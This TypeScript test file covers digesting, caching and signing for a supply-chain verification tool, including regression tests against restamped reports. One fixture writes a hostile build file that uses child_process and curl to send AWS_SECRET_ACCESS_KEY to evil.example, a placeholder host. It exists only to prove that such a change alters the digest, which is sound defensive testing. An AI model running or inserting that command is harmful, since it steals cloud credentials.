/**
 * Content addressing and signing bytes.
 *
 * The signing tests here exist because the first draft of `digest.ts`
 * got this wrong in a way that silently defeated the freshness
 * defense: it stripped `startedAt`/`finishedAt` from the signed
 * payload, so an old report could be restamped as fresh and still
 * verify. These assertions are what stop that regressing.
 */
import { describe, expect, it } from "vitest";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { DirectorySource, RUNTIME_IGNORE } from "../src/sources/directory";
import {
  canonicalizeForComparison,
  canonicalizeForSigning,
  checkCacheKey,
  digestEnvironment,
  digestSuite,
  digestTree,
  pae,
} from "../src/digest";
import { MemorySource } from "../src/sources/memory";
import type { RunEnvironment } from "../src/types";

describe("digestTree", () => {
  it("is stable regardless of the order files were declared", async () => {
    const a = new MemorySource({ "a.txt": "1", "b.txt": "2", "c.txt": "3" });
    const b = new MemorySource({ "c.txt": "3", "a.txt": "1", "b.txt": "2" });
    expect(await digestTree(a)).toBe(await digestTree(b));
  });

  it("changes when any byte of any file changes", async () => {
    const before = await digestTree(new MemorySource({ "a.txt": "hello" }));
    const after = await digestTree(new MemorySource({ "a.txt": "hellp" }));
    expect(before).not.toBe(after);
  });

  it("changes when a file is added or removed", async () => {
    const one = await digestTree(new MemorySource({ "a.txt": "x" }));
    const two = await digestTree(new MemorySource({ "a.txt": "x", "b.txt": "y" }));
    expect(one).not.toBe(two);
  });

  it("distinguishes identical content at different paths", async () => {
    const here = await digestTree(new MemorySource({ "a.txt": "same" }));
    const there = await digestTree(new MemorySource({ "b.txt": "same" }));
    expect(here).not.toBe(there);
  });

  it("ignores .git and node_modules, so transport does not change identity", async () => {
    const bare = new MemorySource({ "a.txt": "x" });
    const cloned = new MemorySource({
      "a.txt": "x",
      ".git/HEAD": "ref: refs/heads/main",
      "node_modules/dep/index.js": "module.exports={}",
      ".DS_Store": "\0\0",
    });
    expect(await digestTree(cloned)).toBe(await digestTree(bare));
  });

  it("produces a hex sha256", async () => {
    expect(await digestTree(new MemorySource({ "a.txt": "x" }))).toMatch(/^[0-9a-f]{64}$/);
  });
});

describe("digestSuite", () => {
  it("is order-independent", () => {
    const a = digestSuite([
      { id: "b", version: "1.0.0" },
      { id: "a", version: "1.0.0" },
    ]);
    const b = digestSuite([
      { id: "a", version: "1.0.0" },
      { id: "b", version: "1.0.0" },
    ]);
    expect(a).toBe(b);
  });

  it("changes when a check version changes — the point of the field", () => {
    const before = digestSuite([{ id: "a", version: "1.0.0" }]);
    const after = digestSuite([{ id: "a", version: "1.0.1" }]);
    expect(before).not.toBe(after);
  });

  it("changes when a check is added", () => {
    const one = digestSuite([{ id: "a", version: "1.0.0" }]);
    const two = digestSuite([
      { id: "a", version: "1.0.0" },
      { id: "b", version: "1.0.0" },
    ]);
    expect(one).not.toBe(two);
  });
});

describe("digestEnvironment", () => {
  const base: RunEnvironment = { runner: "assay/1.0.0" };

  it("is insensitive to key order", () => {
    const a = digestEnvironment({ ...base, config: { x: 1, y: 2 } });
    const b = digestEnvironment({ ...base, config: { y: 2, x: 1 } });
    expect(a).toBe(b);
  });

  it("changes when the judge model changes — a different grade is a different run", () => {
    const a = digestEnvironment({ ...base, models: { judge: { provider: "p", model: "m1" } } });
    const b = digestEnvironment({ ...base, models: { judge: { provider: "p", model: "m2" } } });
    expect(a).not.toBe(b);
  });

  it("changes when a threshold changes", () => {
    const a = digestEnvironment({ ...base, config: { readmeMinWords: 50 } });
    const b = digestEnvironment({ ...base, config: { readmeMinWords: 80 } });
    expect(a).not.toBe(b);
  });
});

describe("checkCacheKey", () => {
  const args = {
    subjectDigest: "d".repeat(64),
    checkId: "x",
    checkVersion: "1.0.0",
    determinism: "deterministic",
    environmentDigest: "env1",
  };

  it("ignores the environment for deterministic checks", () => {
    // The whole point of the tier: these cache across model swaps.
    expect(checkCacheKey(args)).toBe(checkCacheKey({ ...args, environmentDigest: "env2" }));
  });

  it("honours the environment for non-deterministic checks", () => {
    const sampled = { ...args, determinism: "sampled" };
    expect(checkCacheKey(sampled)).not.toBe(
      checkCacheKey({ ...sampled, environmentDigest: "env2" }),
    );
  });

  it("changes with the check version, so a bumped check re-runs", () => {
    expect(checkCacheKey(args)).not.toBe(checkCacheKey({ ...args, checkVersion: "1.0.1" }));
  });

  it("changes with the subject", () => {
    expect(checkCacheKey(args)).not.toBe(checkCacheKey({ ...args, subjectDigest: "e".repeat(64) }));
  });
});

describe("canonicalizeForSigning", () => {
  const report = {
    schemaVersion: "1",
    startedAt: "2026-01-01T00:00:00.000Z",
    finishedAt: "2026-01-01T00:01:00.000Z",
    validity: { staleAfter: "2026-02-01T00:00:00.000Z" },
    score: { overall: 90 },
  };

  // The regression this file exists for.
  it("SIGNS the timestamps, so a stale report cannot be restamped as fresh", () => {
    const restamped = { ...report, finishedAt: "2026-12-31T00:00:00.000Z" };
    expect(canonicalizeForSigning(restamped)).not.toBe(canonicalizeForSigning(report));
  });

  it("signs startedAt too", () => {
    const shifted = { ...report, startedAt: "2025-01-01T00:00:00.000Z" };
    expect(canonicalizeForSigning(shifted)).not.toBe(canonicalizeForSigning(report));
  });

  it("signs validity, so an expiry cannot be extended after the fact", () => {
    const extended = { ...report, validity: { staleAfter: "2099-01-01T00:00:00.000Z" } };
    expect(canonicalizeForSigning(extended)).not.toBe(canonicalizeForSigning(report));
  });

  it("signs the verdict", () => {
    const inflated = { ...report, score: { overall: 100 } };
    expect(canonicalizeForSigning(inflated)).not.toBe(canonicalizeForSigning(report));
  });

  it("excludes only the attestation — a signature cannot sign itself", () => {
    const signed = { ...report, attestation: { signature: "abc" } };
    expect(canonicalizeForSigning(signed)).toBe(canonicalizeForSigning(report));
  });

  it("is insensitive to key order, so a re-serialized report still verifies", () => {
    const reordered = {
      score: { overall: 90 },
      validity: { staleAfter: "2026-02-01T00:00:00.000Z" },
      finishedAt: "2026-01-01T00:01:00.000Z",
      startedAt: "2026-01-01T00:00:00.000Z",
      schemaVersion: "1",
    };
    expect(canonicalizeForSigning(reordered)).toBe(canonicalizeForSigning(report));
  });

  it("sorts nested keys too", () => {
    const a = canonicalizeForSigning({ o: { b: 1, a: 2 } });
    const b = canonicalizeForSigning({ o: { a: 2, b: 1 } });
    expect(a).toBe(b);
  });

  it("preserves array order, which is semantic", () => {
    expect(canonicalizeForSigning({ xs: [1, 2] })).not.toBe(canonicalizeForSigning({ xs: [2, 1] }));
  });
});

describe("canonicalizeForComparison", () => {
  it("ignores timing, so two honest runs of the same computation compare equal", () => {
    const one = { results: [{ checkId: "a", status: "pass", durationMs: 12 }], startedAt: "t1" };
    const two = { results: [{ checkId: "a", status: "pass", durationMs: 987 }], startedAt: "t2" };
    expect(canonicalizeForComparison(one)).toBe(canonicalizeForComparison(two));
  });

  it("still detects a changed verdict", () => {
    const pass = { results: [{ checkId: "a", status: "pass" }] };
    const fail = { results: [{ checkId: "a", status: "fail" }] };
    expect(canonicalizeForComparison(pass)).not.toBe(canonicalizeForComparison(fail));
  });

  it("differs from the signing form — the two serve different questions", () => {
    const r = { finishedAt: "t", score: 1 };
    expect(canonicalizeForComparison(r)).not.toBe(canonicalizeForSigning(r));
  });
});

describe("pae", () => {
  it("binds the payload type into the signed bytes", () => {
    expect(pae("application/a+json", "{}").toString("utf8")).not.toBe(
      pae("application/b+json", "{}").toString("utf8"),
    );
  });

  it("encodes lengths so the framing is unambiguous", () => {
    expect(pae("t", "body").toString("utf8")).toBe("DSSEv1 1 t 4 body");
  });

  it("uses byte length, not character length, for multi-byte payloads", () => {
    // "é" is 2 bytes in UTF-8; a character count would say 1 and make
    // the framing ambiguous.
    expect(pae("t", "é").toString("utf8")).toBe("DSSEv1 1 t 2 é");
  });

  it("cannot be confused across a type/payload boundary shift", () => {
    expect(pae("ab", "c").toString("utf8")).not.toBe(pae("a", "bc").toString("utf8"));
  });
});

/**
 * The digest must cover the artifact's shipped payload.
 *
 * This is the foundation of every integrity claim the tool makes:
 * `assay verify --artifact`, `diff`'s "same artifact digest", the
 * case-cache key. It was computed from a source whose ignore list
 * excludes `dist/` — correct for linting, catastrophic for hashing.
 *
 * Demonstrated before the fix: a package whose `dist/index.js` was
 * `console.log('benign')` and one that curled `~/.aws/credentials` to a
 * remote host produced the SAME sha256, and `assay diff` answered "Same
 * artifact digest… No regressions" with exit 0. That is the postmark-mcp
 * attack the README opens with, invisible to the tool built to catch it.
 */
describe("digest covers shipped build output", () => {
  const pkg = (distBody: string): string => {
    const dir = mkdtempSync(join(tmpdir(), "assay-dg-"));
    mkdirSync(join(dir, "dist"));
    writeFileSync(join(dir, "package.json"), '{"name":"x","version":"1.0.0"}');
    writeFileSync(join(dir, "dist", "index.js"), distBody);
    return dir;
  };
  const digestOf = (dir: string) =>
    digestTree(new DirectorySource(dir, { ignore: RUNTIME_IGNORE }));

  it("DIFFERS when only the shipped payload differs", async () => {
    const benign = pkg("console.log('hi');");
    const evil = pkg(
      "require('child_process').exec('curl https://evil.example/?d='+process.env.AWS_SECRET_ACCESS_KEY);",
    );
    try {
      expect(await digestOf(benign)).not.toBe(await digestOf(evil));
    } finally {
      rmSync(benign, { recursive: true, force: true });
      rmSync(evil, { recursive: true, force: true });
    }
  });

  it("is stable for identical shipped payloads", async () => {
    const a = pkg("console.log('hi');");
    const b = pkg("console.log('hi');");
    try {
      expect(await digestOf(a)).toBe(await digestOf(b));
    } finally {
      rmSync(a, { recursive: true, force: true });
      rmSync(b, { recursive: true, force: true });
    }
  });

  // The analysis source still excludes build output, and should — this
  // asserts the two lists are genuinely different rather than one having
  // been changed into the other.
  it("the ANALYSIS source still excludes build output", async () => {
    const dir = pkg("console.log('hi');");
    try {
      const analysed = (await new DirectorySource(dir).listTree()).map((e) => e.path);
      const hashed = (await new DirectorySource(dir, { ignore: RUNTIME_IGNORE }).listTree()).map(
        (e) => e.path,
      );
      expect(analysed).not.toContain("dist/index.js");
      expect(hashed).toContain("dist/index.js");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

/**
 * Files past the read ceiling must still contribute their content.
 *
 * `readBytes` refuses anything over `maxFileBytes`, and the digest used
 * to substitute the literal string "unreadable" — a constant, which has
 * precisely the effect the surrounding comment says it exists to
 * prevent. Two artifacts differing only in a 3 MB bundle hashed
 * identically. Minified and bundled artifacts routinely exceed it.
 */
describe("large files still contribute to the digest", () => {
  const big = (fill: string) => {
    const dir = mkdtempSync(join(tmpdir(), "assay-big-"));
    writeFileSync(join(dir, "package.json"), '{"name":"x"}');
    writeFileSync(join(dir, "bundle.js"), fill.repeat(3 * 1024 * 1024));
    return dir;
  };

  it("DIFFERS when only an over-ceiling file differs", async () => {
    const a = big("a");
    const b = big("b");
    try {
      expect(await digestTree(new DirectorySource(a))).not.toBe(
        await digestTree(new DirectorySource(b)),
      );
    } finally {
      rmSync(a, { recursive: true, force: true });
      rmSync(b, { recursive: true, force: true });
    }
  });

  it("is stable for identical over-ceiling files", async () => {
    const a = big("a");
    const b = big("a");
    try {
      expect(await digestTree(new DirectorySource(a))).toBe(
        await digestTree(new DirectorySource(b)),
      );
    } finally {
      rmSync(a, { recursive: true, force: true });
      rmSync(b, { recursive: true, force: true });
    }
  });

  // Without a stream the fallback folds in the size, so two genuinely
  // unreadable files of different sizes still differ.
  it("falls back to a size-bearing marker when streaming is unavailable", async () => {
    const noStream = (files: Record<string, number>) => ({
      listTree: async () =>
        Object.entries(files).map(([path, size]) => ({ path, type: "file" as const, size })),
      readFile: async () => null,
      readBytes: async () => null,
      exists: async () => true,
    });
    expect(await digestTree(noStream({ "a.js": 10 }))).not.toBe(
      await digestTree(noStream({ "a.js": 20 })),
    );
  });
});
